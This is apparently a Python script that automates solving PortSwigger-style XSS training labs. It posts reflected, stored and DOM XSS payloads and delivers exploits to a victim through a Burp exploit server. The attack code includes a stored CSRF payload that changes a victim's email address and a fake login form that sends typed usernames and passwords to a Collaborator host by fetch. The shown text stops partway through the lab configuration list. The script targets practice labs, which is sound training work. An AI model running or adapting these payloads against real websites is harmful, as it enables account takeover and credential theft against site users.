import requests
from bs4 import BeautifulSoup
import re
import os
from datetime import datetime
from colorama import Fore, Style, init
from urllib.parse import urlencode, urlparse

# Initialize Colorama for cross-platform compatibility
init(autoreset=True)

# Define paths relative to the project root
# This assumes the script is located in a subdirectory (e.g., 'scripts')
# If your script is directly in the project root, you might need to adjust this.
# Example: If script is at /root/Desktop/customwafbypass/scripts/burp_xss_lab_solver.py
# then PROJECT_ROOT will be /root/Desktop/customwafbypass
PROJECT_ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
LOGS_DIR = os.path.join(PROJECT_ROOT, "logs")
REPORTS_DIR = os.path.join(PROJECT_ROOT, "report")
PAYLOADS_DIR = os.path.join(PROJECT_ROOT, "payloads") 

# Ensure directories exist
os.makedirs(LOGS_DIR, exist_ok=True)
os.makedirs(REPORTS_DIR, exist_ok=True)
os.makedirs(PAYLOADS_DIR, exist_ok=True)

# --- GLOBAL CONFIGURATIONS ---
# Placeholders for Exploit Server and Collaborator URLs - YOU MUST UPDATE THESE!
# These are used as default values for relevant attack methods.
YOUR_EXPLOIT_SERVER_URL = "https://YOUR_EXPLOIT_SERVER_URL.exploit-server.net" 
YOUR_BURP_COLLABORATOR_URL = "YOUR_BURP_COLLABORATOR_URL.burpcollaborator.net"


def log_message(message, level="INFO", log_file="xss_solver.log"):
    """Logs messages to a specified log file and prints to console with color."""
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    color = ""
    prefix = ""
    if level == "INFO":
        color = Fore.CYAN
    elif level == "WARNING":
        color = Fore.YELLOW
    elif level == "ERROR":
        color = Fore.RED
    elif level == "SUCCESS":
        color = Fore.GREEN
        prefix = "🎉 " # Add a celebration emoji for success
    elif level == "DEBUG":
        color = Fore.MAGENTA
    
    console_output = f"{color}[{timestamp}] [{level}] {prefix}{message}{Style.RESET_ALL}"
    file_output = f"[{timestamp}] [{level}] {message}"
    
    with open(os.path.join(LOGS_DIR, log_file), "a") as f:
        f.write(file_output + "\n")
    print(console_output)

def create_report(lab_name, url, method, payload, status, vulnerable_parameter=None, attack_method_name="N/A", response_text=None, request_details=None, form_fields=None):
    """
    Creates a detailed report in a more readable Markdown-like format,
    including vulnerability specifics and potentially form fields.
    """
    # Sanitize lab_name to create a valid filename
    sanitized_lab_name = re.sub(r'[^\w\-_\. ]', '', lab_name).replace(' ', '_')
    report_filename = f"{sanitized_lab_name}_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.md"
    report_path = os.path.join(REPORTS_DIR, report_filename)
    
    with open(report_path, "w") as f:
        f.write(f"# XSS Lab Report: {lab_name}\n\n")
        f.write(f"**Date & Time:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        f.write(f"**Status:** **{status}**\n\n")
        
        f.write(f"## Vulnerability Details\n")
        # Attempt to categorize type based on parameter or attack method name
        if vulnerable_parameter and ('comment' in vulnerable_parameter.lower() or 'website' in vulnerable_parameter.lower()):
            xss_type = 'Stored XSS'
        elif "DOM XSS" in attack_method_name:
            xss_type = 'DOM XSS'
        elif "Reflected XSS" in attack_method_name:
            xss_type = 'Reflected XSS'
        else:
            xss_type = 'Reflected/DOM XSS' # Default
        f.write(f"- **Type:** {xss_type}\n")
        f.write(f"- **Vulnerable Parameter:** `{vulnerable_parameter if vulnerable_parameter else 'Not specified'}`\n")
        f.write(f"- **Attack Method Used:** `{attack_method_name}`\n")
        f.write(f"- **Payload Used:** `{payload}`\n")
        
        f.write(f"## Request Information\n")
        f.write(f"**Method:** `{method}`\n")
        f.write(f"**Target URL:** `{url}`\n")
        if form_fields:
            f.write(f"**Form Fields (if POST):**\n")
            f.write(f"```json\n")
            for field, value in form_fields.items():
                # Avoid displaying raw HTML/JS in report directly, just indicate it was there
                display_value = value
                if isinstance(value, str) and ("<script" in value or "<img" in value or "javascript:" in value):
                    display_value = f"[XSS Payload - truncated or encoded for display: {value[:100]}...]"
                f.write(f'  "{field}": "{display_value}"\n')
            f.write(f"```\n\n")

        if request_details:
            f.write(f"**Full Request (Simplified):**\n")
            f.write(f"```http\n")
            f.write(request_details + "\n")
            f.write(f"```\n\n")
        
        if response_text:
            f.write(f"## Response Details\n")
            f.write(f"```html\n")
            
            snippet_found = False
            snippet_start = response_text.find(payload)
            
            if snippet_start != -1:
                start_index = max(0, snippet_start - 200)
                end_index = min(len(response_text), snippet_start + len(payload) + 200)
                f.write(response_text[start_index:end_index] + "\n")
                snippet_found = True
            
            # Check if full response wasn't captured or if snippet is not from beginning/end
            if snippet_found and (len(response_text) > end_index or start_index > 0):
                f.write("\n... (Full response truncated for brevity) ...\n")
            elif not snippet_found: # If payload was not found at all
                f.write("Payload not directly found in relevant snippet. Showing beginning of response.\n")
                f.write(response_text[:min(len(response_text), 1000)] + "\n...\n") # Ensure not to slice beyond length
            
            f.write(f"```\n")
            f.write(f"\n**Full Response Length:** {len(response_text)} bytes\n")

    log_message(f"Report generated: {report_path}", level="INFO")

def read_payloads(payloads_file="xss_payloads.txt"):
    """Reads XSS payloads from a specified file."""
    payloads_path = os.path.join(PAYLOADS_DIR, payloads_file)
    payloads = []
    try:
        with open(payloads_path, "r") as f:
            for line in f:
                payload = line.strip()
                if payload and not payload.startswith("#"):
                    payloads.append(payload)
        log_message(f"Loaded {len(payloads)} payloads from {payloads_path}", level="INFO")
    except FileNotFoundError:
        log_message(f"Payloads file not found: {payloads_path}. Please create it.", level="ERROR", log_file="xss_errors.log")
    return payloads

def read_targets(targets_file="targets.txt"):
    """
    Reads target URLs from a specified file. Each line should contain only a URL.
    This file should be in the 'logs' directory by default.
    """
    targets_path = os.path.join(LOGS_DIR, targets_file) 
    urls = []
    try:
        with open(targets_path, "r") as f:
            for line in f:
                url = line.strip()
                if url and not url.startswith("#"):
                    urls.append(url)
        log_message(f"Loaded {len(urls)} targets from {targets_path}", level="INFO")
    except FileNotFoundError:
        log_message(f"Targets file not found: {targets_path}. Please create it.", level="ERROR", log_file="xss_errors.log")
    return urls

# --- Saldırı Metodu Fonksiyonları ---
# Her fonksiyon, belirli bir XSS saldırı tekniğini temsil eder.
# Başarılı olursa True döner ve raporlama bilgilerini loglar.
# Başarısız olursa False döner.

def fetch_page_with_session_and_csrf(base_url, post_id="1"):
    """Fetches a post page to extract session cookie and CSRF token."""
    post_page_url = f"{base_url.rstrip('/')}/post?postId={post_id}"
    try:
        initial_response = requests.get(post_page_url, timeout=15)
        initial_response.raise_for_status()
        
        session_cookie = initial_response.cookies.get("session")
        csrf_match = re.findall(r"name=\"csrf\" value=\"(.+?)\"", initial_response.text)
        csrf_token = csrf_match[0] if csrf_match else None

        if not session_cookie:
            log_message(f"WARNING: Session cookie not found for {base_url}.", level="WARNING")
        if not csrf_token:
            log_message(f"ERROR: CSRF token not found for {base_url}. Cannot proceed with comment post.", level="ERROR", log_file="xss_errors.log")
            return None, None, None
        return initial_response, session_cookie, csrf_token
    except requests.exceptions.RequestException as e:
        log_message(f"ERROR: Failed to fetch post page {post_page_url} - {e}", level="ERROR", log_file="xss_errors.log")
        return None, None, None

def attack_get_parameter_xss(base_url, payload, lab_name, parameter_name="search", path="/", check_path=None):
    """
    Attacks a GET-based parameter for Reflected/DOM XSS. Generalized for various GET parameters and paths.
    """
    method_name = f"GET Parameter XSS (Param: '{parameter_name}', Path: '{path}')"
    log_message(f"Trying Attack Method: {method_name} with payload '{payload}'", level="DEBUG")

    # Construct the URL based on path and parameter_name
    parsed_url = urlparse(base_url)
    
    # If path is given, combine it with netloc
    full_url = f"{parsed_url.scheme}://{parsed_url.netloc}{path}"

    # Append query parameter
    # Ensure correct handling if there are already parameters
    if "?" in full_url:
        full_url_with_payload = f"{full_url}&{parameter_name}={payload}"
    else:
        full_url_with_payload = f"{full_url}?{parameter_name}={payload}"


    http_method = "GET"
    
    # Special handling for canonical link tag lab where payload is directly appended
    if parameter_name == "direct_url_append": # Custom internal flag
        full_url_with_payload = f"{base_url.rstrip('/')}{path}{payload}"
        method_name = f"GET Direct URL Append XSS (Path: '{path}')"


    request_details_for_report = f"{http_method} {urlparse(full_url_with_payload).path}?{urlparse(full_url_with_payload).query} HTTP/1.1\nHost: {urlparse(base_url).netloc}\nUser-Agent: Python-Requests/{requests.__version__}"
    
    try:
        response = requests.get(full_url_with_payload, timeout=15)
        
        if "Congratulations, you solved the lab!" in response.text:
            log_message(f"!!! LAB SOLVED: {lab_name} using {method_name} !!!", level="SUCCESS")
            log_message(f"Vulnerable Parameter: '{parameter_name}'", level="SUCCESS")
            log_message(f"Method Used: {http_method}", level="SUCCESS")
            log_message(f"Payload Used: {payload}", level="SUCCESS")
            log_message(f"Attack Method: {method_name}", level="SUCCESS")
            
            create_report(
                lab_name=lab_name,
                url=full_url_with_payload,
                method=http_method,
                payload=payload,
                status="SOLVED",
                vulnerable_parameter=parameter_name,
                attack_method_name=method_name,
                response_text=response.text,
                request_details=request_details_for_report
            )
            return True
        
        # For labs where the solution is triggered on a different page (e.g., /feedback for returnPath)
        if check_path:
            check_url = f"{base_url.rstrip('/')}{check_path}"
            log_message(f"Checking {check_url} for lab solved status...", level="DEBUG")
            check_response = requests.get(check_url, timeout=15)
            if "Congratulations, you solved the lab!" in check_response.text:
                log_message(f"!!! LAB SOLVED: {lab_name} using {method_name} (Triggered on {check_path}) !!!", level="SUCCESS")
                log_message(f"Vulnerable Parameter: '{parameter_name}'", level="SUCCESS")
                log_message(f"Method Used: {http_method}", level="SUCCESS")
                log_message(f"Payload Used: {payload}", level="SUCCESS")
                log_message(f"Attack Method: {method_name}", level="SUCCESS")
                
                create_report(
                    lab_name=lab_name,
                    url=check_url, # Report the URL where it was solved
                    method=http_method,
                    payload=payload,
                    status="SOLVED",
                    vulnerable_parameter=parameter_name,
                    attack_method_name=f"{method_name} (Triggered on {check_path})",
                    response_text=check_response.text,
                    request_details=request_details_for_report
                )
                return True

    except requests.exceptions.RequestException as e:
        log_message(f"ERROR ({method_name}): Request failed for {full_url_with_payload} - {e}", level="ERROR", log_file="xss_errors.log")
        pass 
    return False

def attack_post_form_xss(base_url, payload, lab_name, target_field="comment", other_form_fields=None):
    """
    Attacks a POST-based form for Stored XSS. Generalized for different target fields and additional form data.
    """
    method_name = f"POST Form XSS (Target Field: '{target_field}')"
    log_message(f"Trying Attack Method: {method_name} with payload '{payload}'", level="DEBUG")

    initial_response, session_cookie, csrf_token = fetch_page_with_session_and_csrf(base_url)
    if not csrf_token:
        return False

    comment_submit_path = "/post/comment"
    post_target_url = f"{base_url.rstrip('/')}{comment_submit_path}"
    blog_page_url_to_check = f"{base_url.rstrip('/')}/post?postId=1" # Assumes labs trigger on blog post 1

    http_method = "POST"
    
    form_data = {
        "csrf": csrf_token,
        "postId": "1",
        "name": "Hacker",
        "email": "hack@me.com",
    }
    form_data[target_field] = payload

    if other_form_fields:
        form_data.update(other_form_fields) # Add/override other fields

    cookies_to_send = {"session": session_cookie} if session_cookie else {}
    encoded_form_data = urlencode(form_data)

    request_details_for_report = (
        f"{http_method} {comment_submit_path} HTTP/1.1\n"
        f"Host: {urlparse(base_url).netloc}\n"
        f"User-Agent: Python-Requests/{requests.__version__}\n"
        f"Cookie: session={cookies_to_send.get('session', '')}\n" # Mask cookie in report
        f"Content-Type: application/x-www-form-urlencoded\n"
        f"Content-Length: {len(encoded_form_data)}\n\n"
        f"{encoded_form_data}"
    )

    try:
        response = requests.post(post_target_url, data=form_data, cookies=cookies_to_send, timeout=15, allow_redirects=True)

        if "Congratulations, you solved the lab!" in response.text:
            log_message(f"!!! LAB SOLVED: {lab_name} using {method_name} !!!", level="SUCCESS")
            log_message(f"Vulnerable Parameter: '{target_field}' (POST field)", level="SUCCESS")
            log_message(f"Method Used: {http_method}", level="SUCCESS")
            log_message(f"Payload Used: {payload}", level="SUCCESS")
            log_message(f"Attack Method: {method_name}", level="SUCCESS")
            
            create_report(
                lab_name=lab_name,
                url=response.url,
                method=http_method, 
                payload=payload,
                status="SOLVED",
                vulnerable_parameter=target_field,
                attack_method_name=method_name,
                response_text=response.text,
                request_details=request_details_for_report,
                form_fields=form_data
            )
            return True

        # Check the blog page explicitly if not solved directly
        blog_response = requests.get(blog_page_url_to_check, cookies=cookies_to_send, timeout=15)
        if "Congratulations, you solved the lab!" in blog_response.text:
            log_message(f"!!! LAB SOLVED: {lab_name} using {method_name} (Triggered on Blog Page) !!!", level="SUCCESS")
            log_message(f"Vulnerable Parameter: '{target_field}' (POST field)", level="SUCCESS")
            log_message(f"Method Used: {http_method}", level="SUCCESS")
            log_message(f"Payload Used: {payload}", level="SUCCESS")
            log_message(f"Attack Method: {method_name}", level="SUCCESS")
            
            create_report(
                lab_name=lab_name,
                url=blog_page_url_to_check, 
                method=http_method, 
                payload=payload,
                status="SOLVED",
                vulnerable_parameter=target_field,
                attack_method_name=f"{method_name} (Triggered on Blog Page)",
                response_text=blog_response.text,
                request_details=request_details_for_report,
                form_fields=form_data
            )
            return True

    except requests.exceptions.RequestException as e:
        log_message(f"ERROR ({method_name}): Request failed for {post_target_url} - {e}", level="ERROR", log_file="xss_errors.log")
        pass 
    return False

def attack_exploit_server_xss(base_url, payload, lab_name, exploit_server_url, description="Exploit Server XSS"):
    """
    Delivers an XSS exploit via a user-controlled exploit server. This function requires the user to provide their Burp Exploit Server URL.
    Note: The `payload` argument is included for consistency but might not be directly used if the exploit_html_payload is self-contained.
    """
    method_name = f"Exploit Server: {description}"
    log_message(f"Trying Attack Method: {method_name} with payload '{payload}'", level="DEBUG") # Log actual payload passed
    
    if "YOUR_EXPLOIT_SERVER_URL" in exploit_server_url:
        log_message(f"WARNING: EXPLOIT_SERVER_URL is a placeholder for {method_name}. Please update it in the script.", level="WARNING")
        return False

    response_head = "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8"
    data = { 
        "responseBody": payload, # The payload here is the exploit_html_payload
        "responseHead": response_head, 
        "formAction": "DELIVER_TO_VICTIM", 
        "urlIsHttps": "on", 
        "responseFile": "/exploit" 
    }
    encoded_data = urlencode(data) # For request_details_for_report

    request_details_for_report = (
        f"POST / HTTP/1.1\n"
        f"Host: {urlparse(exploit_server_url).netloc}\n"
        f"User-Agent: Python-Requests/{requests.__version__}\n"
        f"Content-Type: application/x-www-form-urlencoded\n"
        f"Content-Length: {len(encoded_data)}\n\n"
        f"{encoded_data}"
    )

    try:
        log_message(f"Delivering exploit to victim via {exploit_server_url}...", level="INFO")
        response = requests.post(exploit_server_url, data, timeout=15)
        response.raise_for_status() # Raise HTTPError for bad responses (4xx or 5xx)
        
        # Exploit server labs are usually solved by the victim visiting the exploit,
        # so we check if the lab URL itself is marked as solved after exploit delivery.
        # This is a common pattern for Burp Suite labs.
        # We assume the solution is checked on the main page of the lab.
        check_lab_response = requests.get(base_url, timeout=15)
        if "Congratulations, you solved the lab!" in check_lab_response.text:
            log_message(f"!!! LAB SOLVED: {lab_name} using {method_name} !!!", level="SUCCESS")
            create_report(
                lab_name=lab_name,
                url=base_url, # Report the lab URL, not the exploit server URL
                method="POST", # Method for delivering the exploit
                payload=payload,
                status="SOLVED",
                vulnerable_parameter="N/A (Exploit Server)",
                attack_method_name=method_name,
                response_text=check_lab_response.text,
                request_details=request_details_for_report
            )
            return True

    except requests.exceptions.RequestException as e:
        log_message(f"ERROR ({method_name}): Failed to deliver exploit via {exploit_server_url} - {e}", level="ERROR", log_file="xss_errors.log")
        pass
    return False

def attack_exploit_server_hashchange_iframe(base_url, payload, lab_name, exploit_server_url=YOUR_EXPLOIT_SERVER_URL):
    """
    Lab: DOM XSS in jQuery selector sink using a hashchange event.
    Exploit: iframe with onload that appends img to hash.
    The payload for this is self-contained in the exploit HTML.
    """
    exploit_html_payload = f'''<iframe src="{base_url}/#" onload="this.src+='<img src=1 onerror=print()>'">'''
    # The 'payload' argument here is ignored as exploit_html_payload is hardcoded
    return attack_exploit_server_xss(base_url, exploit_html_payload, lab_name, exploit_server_url, "DOM XSS via Hashchange Event (Exploit Server)")

def attack_exploit_server_reflected_custom_tags(base_url, payload, lab_name, exploit_server_url=YOUR_EXPLOIT_SERVER_URL):
    """
    Lab: Reflected XSS into HTML context with all tags blocked except custom ones.
    Exploit: Script redirecting to lab URL with specific payload.
    """
    # The payload argument here is actually the specific payload for the lab's search parameter
    payload_for_lab_url = payload 
    exploit_html_payload = f'''<script>
                    location = "{base_url}/?search={payload_for_lab_url}"
                </script>'''
    return attack_exploit_server_xss(base_url, exploit_html_payload, lab_name, exploit_server_url, "Reflected XSS with Custom Tags (Exploit Server)")

def attack_exploit_server_reflected_body_resize(base_url, payload, lab_name, exploit_server_url=YOUR_EXPLOIT_SERVER_URL):
    """
    Lab: Reflected XSS into HTML context with most tags and attributes blocked.
    Exploit: iframe with onload that changes body width to trigger onresize.
    """
    # The payload argument here is the specific body tag payload for the lab's search parameter
    payload_for_lab_url = payload
    exploit_html_payload = f'''<iframe src="{base_url}/?search={payload_for_lab_url}" onload=this.style.width='100px'>'''
    return attack_exploit_server_xss(base_url, exploit_html_payload, lab_name, exploit_server_url, "Reflected XSS with Body Resize (Exploit Server)")

def attack_post_comment_form_csrf_xss(base_url, payload, lab_name):
    """
    Lab: Exploiting XSS to perform CSRF. Posts a specific JavaScript payload to the comment field to change victim's email.
    Note: The `payload` argument is included for consistency but the actual payload is often crafted internally.
    """
    method_name = "POST Comment Form XSS (CSRF Email Change)"
    log_message(f"Trying Attack Method: {method_name}", level="DEBUG")

    initial_response, session_cookie, csrf_token = fetch_page_with_session_and_csrf(base_url)
    if not csrf_token:
        return False
    
    # Specific payload for CSRF lab to change email
    # Use the 'payload' argument from the caller if provided, otherwise default.
    # For this specific lab, the payload is typically fixed to change email.
    actual_payload_to_send = f"""<script>
                        window.onload = function(){{
                            var token = document.forms[0].firstElementChild.value;
                            fetch("{base_url}/my-account/change-email", {{
                                method: "POST",
                                headers: {{
                                    "Content-Type":  "application/x-www-form-urlencoded"
                                }},
                                body: "csrf=" + token + "&email=hacked@you.com" 
                            }});
                        }};
                    </script>"""
    
    form_data = { 
        "comment": actual_payload_to_send, # Use the crafted payload
        "csrf": csrf_token, 
        "postId": "1", 
        "name": "Hacker", 
        "email": "hack@me.com" 
    }
    cookies_to_send = { "session": session_cookie } if session_cookie else {}

    comment_submit_path = "/post/comment"
    post_target_url = f"{base_url.rstrip('/')}{comment_submit_path}"
    blog_page_url_to_check = f"{base_url.rstrip('/')}/post?postId=1" # Assumes lab is solved on blog page

    encoded_form_data = urlencode(form_data)
    request_details_for_report = (
        f"POST {comment_submit_path} HTTP/1.1\n"
        f"Host: {urlparse(base_url).netloc}\n"
        f"User-Agent: Python-Requests/{requests.__version__}\n"
        f"Cookie: session={cookies_to_send.get('session', '')}\n" # Mask cookie in report
        f"Content-Type: application/x-www-form-urlencoded\n"
        f"Content-Length: {len(encoded_form_data)}\n\n"
        f"{encoded_form_data}"
    )

    try:
        response = requests.post(post_target_url, data=form_data, cookies=cookies_to_send, timeout=15, allow_redirects=True)

        if "Congratulations, you solved the lab!" in response.text:
            log_message(f"!!! LAB SOLVED: {lab_name} using {method_name} !!!", level="SUCCESS")
            create_report(
                lab_name=lab_name,
                url=response.url,
                method="POST",
                payload=actual_payload_to_send, # Report the actual payload used
                status="SOLVED",
                vulnerable_parameter="comment",
                attack_method_name=method_name,
                response_text=response.text,
                request_details=request_details_for_report,
                form_fields=form_data
            )
            return True
        # Check the blog page explicitly if not solved directly
        blog_response = requests.get(blog_page_url_to_check, cookies=cookies_to_send, timeout=15)
        if "Congratulations, you solved the lab!" in blog_response.text:
            log_message(f"!!! LAB SOLVED: {lab_name} using {method_name} (Triggered on Blog Page) !!!", level="SUCCESS")
            create_report(
                lab_name=lab_name,
                url=blog_page_url_to_check,
                method="POST",
                payload=actual_payload_to_send, # Report the actual payload used
                status="SOLVED",
                vulnerable_parameter="comment",
                attack_method_name=f"{method_name} (Triggered on Blog Page)",
                response_text=blog_response.text,
                request_details=request_details_for_report,
                form_fields=form_data
            )
            return True
    except requests.exceptions.RequestException as e:
        log_message(f"ERROR ({method_name}): Request failed for {post_target_url} - {e}", level="ERROR", log_file="xss_errors.log")
        pass 
    return False

def attack_post_comment_form_capture_passwords_xss(base_url, payload, lab_name, burp_collaborator_url=YOUR_BURP_COLLABORATOR_URL):
    """
    Lab: Exploiting cross-site scripting to capture passwords.
    Posts a specific JavaScript payload to the comment field to send credentials to Burp Collaborator.
    Note: The `payload` argument is included for consistency but the actual payload is often crafted internally.
    """
    method_name = "POST Comment Form XSS (Capture Passwords)"
    log_message(f"Trying Attack Method: {method_name}", level="DEBUG")
    if "YOUR_BURP_COLLABORATOR_URL" in burp_collaborator_url:
        log_message(f"WARNING: BURP_COLLABORATOR_URL is a placeholder for {method_name}. Please update it in the script.", level="WARNING")
        return False

    initial_response, session_cookie, csrf_token = fetch_page_with_session_and_csrf(base_url)
    if not csrf_token:
        return False
    
    # Specific payload for password capture lab
    # Use the 'payload' argument from the caller if provided, otherwise default.
    actual_payload_to_send = f"""<input name=username id=username> <input name=password type=password onchange="if(this.value.length){{fetch('https://{burp_collaborator_url}',{{ method:'POST', mode: 'no-cors', body: username.value+':'+this.value }}); }}">"""
    form_data = { 
        "comment": actual_payload_to_send, # Use the crafted payload
        "csrf": csrf_token, 
        "postId": "1", 
        "name": "Hacker", 
        "email": "hack@me.com" 
    }
    cookies_to_send = { "session": session_cookie } if session_cookie else {}

    comment_submit_path = "/post/comment"
    post_target_url = f"{base_url.rstrip('/')}{comment_submit_path}"
    blog_page_url_to_check = f"{base_url.rstrip('/')}/post?postId=1" 
    encoded_form_data = urlencode(form_data)
    request_details_for_report = (
        f"POST {comment_submit_path} HTTP/1.1\n"
        f"Host: {urlparse(base_url).netloc}\n"
        f"User-Agent: Python-Requests/{requests.__version__}\n"
        f"Cookie: session={cookies_to_send.get('session', '')}\n" # Mask cookie in report
        f"Content-Type: application/x-www-form-urlencoded\n"
        f"Content-Length: {len(encoded_form_data)}\n\n"
        f"{encoded_form_data}"
    )

    try:
        response = requests.post(post_target_url, data=form_data, cookies=cookies_to_send, timeout=15, allow_redirects=True)
        if "Congratulations, you solved the lab!" in response.text:
            log_message(f"!!! LAB SOLVED: {lab_name} using {method_name} !!!", level="SUCCESS")
            create_report(
                lab_name=lab_name,
                url=response.url,
                method="POST",
                payload=actual_payload_to_send, # Report the actual payload used
                status="SOLVED",
                vulnerable_parameter="comment",
                attack_method_name=method_name,
                response_text=response.text,
                request_details=request_details_for_report,
                form_fields=form_data
            )
            return True
        # Check the blog page explicitly if not solved directly
        blog_response = requests.get(blog_page_url_to_check, cookies=cookies_to_send, timeout=15)
        if "Congratulations, you solved the lab!" in blog_response.text:
            log_message(f"!!! LAB SOLVED: {lab_name} using {method_name} (Triggered on Blog Page) !!!", level="SUCCESS")
            create_report(
                lab_name=lab_name,
                url=blog_page_url_to_check,
                method="POST",
                payload=actual_payload_to_send, # Report the actual payload used
                status="SOLVED",
                vulnerable_parameter="comment",
                attack_method_name=f"{method_name} (Triggered on Blog Page)",
                response_text=blog_response.text,
                request_details=request_details_for_report,
                form_fields=form_data
            )
            return True
    except requests.exceptions.RequestException as e:
        log_message(f"ERROR ({method_name}): Request failed for {post_target_url} - {e}", level="ERROR", log_file="xss_errors.log")
        pass 
    return False

# New dedicated solver function for the "DOM XSS in jQuery selector sink using a hashchange event" lab
# This function does not take a 'payload' argument as it crafts its own.
def solve_dom_xss_jquery_hashchange_new_lab_specific(lab_name, lab_url, exploit_server_url=YOUR_EXPLOIT_SERVER_URL):
    """
    Lab: DOM XSS in jQuery selector sink using a hashchange event.
    Exploit: iframe with onload that appends img to hash.
    This function implements the exact logic provided by the user for this specific lab.
    """
    log_message(f"--- Running specific solver for: {lab_name} ---", level="INFO")
    
    response_head = "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8"
    # Payload is crafted internally by this specific lab solver
    payload = f"""<iframe src="{lab_url}/#" onload="this.src+='<img src=1 onerror=print()>'">"""
    data = { "responseBody": payload, "responseHead": response_head, "formAction": "DELIVER_TO_VICTIM", "urlIsHttps": "on", "responseFile": "/exploit" }

    log_message(f"❯❯ Delivering the exploit to the victim for {lab_name} via {exploit_server_url}.. ", level="INFO")
    
    request_details_for_report = (
        f"POST / HTTP/1.1\n"
        f"Host: {urlparse(exploit_server_url).netloc}\n"
        f"User-Agent: Python-Requests/{requests.__version__}\n"
        f"Content-Type: application/x-www-form-urlencoded\n"
        f"Content-Length: {len(urlencode(data))}\n\n"
        f"{urlencode(data)}"
    )

    try:
        response = requests.post(exploit_server_url, data, timeout=15)
        response.raise_for_status() # Raise HTTPError for bad responses (4xx or 5xx)

        log_message("Exploit delivered. Checking lab status...", level="INFO")
        # Check if the lab is solved after delivering the exploit
        # This often requires the victim to visit the exploit URL, which the exploit server handles.
        # We then check the lab URL to see if it's marked as solved.
        check_lab_response = requests.get(lab_url, timeout=15)
        
        if "Congratulations, you solved the lab!" in check_lab_response.text:
            log_message(f"!!! LAB SOLVED: {lab_name} using DOM XSS in jQuery selector sink !!!", level="SUCCESS")
            create_report(
                lab_name=lab_name,
                url=lab_url,
                method="POST", # Method for delivering exploit
                payload=payload,
                status="SOLVED",
                vulnerable_parameter="N/A (Exploit Server)",
                attack_method_name="DOM XSS via Hashchange (Specific Lab Solver)",
                response_text=check_lab_response.text,
                request_details=request_details_for_report
            )
            return True
        else:
            log_message(f"Lab {lab_name} not solved yet after exploit delivery. Check victim interaction.", level="WARNING")
            create_report(
                lab_name=lab_name,
                url=lab_url,
                method="POST",
                payload=payload,
                status="NOT SOLVED",
                vulnerable_parameter="N/A (Exploit Server)",
                attack_method_name="DOM XSS via Hashchange (Specific Lab Solver)",
                response_text=check_lab_response.text,
                request_details=request_details_for_report
            )
            return False

    except requests.exceptions.RequestException as e:
        log_message(f"ERROR: Failed to deliver the exploit to the victim for {lab_name} - {e}", level="ERROR", log_file="xss_errors.log")
        create_report(
            lab_name=lab_name,
            url=lab_url,
            method="POST",
            payload=payload,
            status="FAILED",
            vulnerable_parameter="N/A (Exploit Server)",
            attack_method_name="DOM XSS via Hashchange (Specific Lab Solver)",
            response_text=str(e), # Log the error message
            request_details=request_details_for_report
        )
        return False
    except Exception as e:
        log_message(f"ERROR: An unexpected error occurred during {lab_name} solution: {e}", level="ERROR", log_file="xss_errors.log")
        create_report(
            lab_name=lab_name,
            url=lab_url,
            method="POST",
            payload=payload,
            status="FAILED",
            vulnerable_parameter="N/A (Exploit Server)",
            attack_method_name="DOM XSS via Hashchange (Specific Lab Solver)",
            response_text=str(e), # Log the error message
            request_details=request_details_for_report
        )
        return False

# --- ATTACK STRATEGY CONFIGURATIONS ---
# This list defines various XSS attack strategies/methods.
# For each URL provided in targets.txt, the script will try to apply these strategies.
LAB_CONFIGS = [
    {
        "name": "DOM XSS in document.write sink using source location.search",
        "method": attack_get_parameter_xss, 
        "args": {"parameter_name": "search", "path": "/"},
        "payloads_to_try": ["\"><script>alert(1)</script>"] 
    },
    {
        "name": "DOM XSS in innerHTML sink using source location.search",
        "method": attack_get_parameter_xss, 
        "args": {"parameter_name": "search", "path": "/"},
        "payloads_to_try": ["'-alert(1)-'", "<img src=1 onerror=alert(1)>"] # Added user's payload
    },
    {
        "name": "DOM XSS in jQuery anchor href attribute sink using location.search source",
        "method": attack_get_parameter_xss,
        "args": {"parameter_name": "returnPath", "path": "/feedback", "check_path": "/"},
        "payloads_to_try": ["javascript:alert(1)"]
    },
    {
        "name": "Reflected XSS into attribute with angle brackets HTML-encoded",
        "method": attack_get_parameter_xss,
        "args": {"parameter_name": "search", "path": "/"},
        "payloads_to_try": ["\" autofocus onfocus=\"alert(1)"]
    },
    {
        "name": "Stored XSS into HTML context with nothing encoded",
        "method": attack_post_form_xss,
        "args": {"target_field": "comment"},
        "payloads_to_try": ["<script>alert(document.cookie)</script>"]
    },
    {
        "name": "Reflected XSS into HTML context with nothing encoded",
        "method": attack_get_parameter_xss,
        "args": {"parameter_name": "search", "path": "/"},
        "payloads_to_try": ["<script>alert(1)</script>"]
    },
    {
        "name": "Stored XSS into HTML context with all tags encoded except custom ones",
        "method": attack_post_form_xss,
        "args": {"target_field": "comment"},
        "payloads_to_try": ["<custom-tag onmouseover='alert(1)'>Hover me</custom-tag>"]
    },
    {
        "name": "Reflected XSS into HTML context with all tags blocked except custom ones",
        "method": attack_exploit_server_reflected_custom_tags,
        "args": {"exploit_server_url": YOUR_EXPLOIT_SERVER_URL},
        "payloads_to_try": ["<xss autofocus tabindex=1 onfocus=alert(document.cookie)></xss>"] # Specific payload required
    },
    {
        "name": "Reflected XSS into HTML context with most tags and attributes blocked",
        "method": attack_exploit_server_reflected_body_resize,
        "args": {"exploit_server_url": YOUR_EXPLOIT_SERVER_URL},
        "payloads_to_try": ["<body onresize=print()>"] # Specific payload required
    },
    {
        "name": "Exploiting XSS to perform CSRF",
        "method": attack_post_comment_form_csrf_xss,
        "args": {}, # Payload is crafted internally by the method
        "payloads_to_try": [""] # Dummy payload, as it's crafted internally
    },
    {
        "name": "Exploiting cross-site scripting to capture passwords",
        "method": attack_post_comment_form_capture_passwords_xss,
        "args": {"burp_collaborator_url": YOUR_BURP_COLLABORATOR_URL},
        "payloads_to_try": [""] # Dummy payload, as it's crafted internally
    },
    {
        "name": "DOM XSS in jQuery selector sink using a hashchange event",
        "method": solve_dom_xss_jquery_hashchange_new_lab_specific, # Direct call to the specific solver
        "args": {"exploit_server_url": YOUR_EXPLOIT_SERVER_URL}, # Make sure this is YOUR exploit server URL
        "payloads_to_try": [] # Not applicable for this custom solver as it crafts its own payload
    },
    {
        "name": "Stored XSS into anchor href attribute with double quotes HTML-encoded",
        "method": attack_post_form_xss,
        "args": {"target_field": "website"},
        "payloads_to_try": ["javascript:alert(1)"]
    },
